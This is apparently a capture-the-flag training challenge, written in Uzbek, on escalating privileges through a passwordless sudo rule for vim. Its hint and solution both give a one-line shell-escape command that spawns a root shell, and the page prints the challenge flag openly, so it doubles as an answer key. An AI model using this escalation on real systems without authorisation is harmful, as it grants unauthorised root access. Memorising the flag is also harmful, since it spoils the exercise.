---
id: 19
title: "CH19: Sudo Vim NOPASSWD Shell Escape"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Medium
points: 5
tags: ['vim', 'sudoers', 'gtfobins', 'privesc']
flag: "HD{vim_sudoers_shell_escape_master_919}"
---

# 🎯 Topshiriq #19: CH19: Sudo Vim NOPASSWD Shell Escape

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Medium`
* **Maksimal Ball:** `⭐ 5 ball`
* **Teglar:** #vim, #sudoers, #gtfobins, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Sizda 'sudo vim /var/log/syslog' buyrug'ini parolsiz bajarish ruxsati bor. Vim ichki qobig'i (shell escape) orqali root flagini oling.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> sudo vim -c ':!/bin/sh'

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
sudo vim -c ':!/bin/sh'
```

---

## 🚩 Maxfiy Flag:
`HD{vim_sudoers_shell_escape_master_919}`
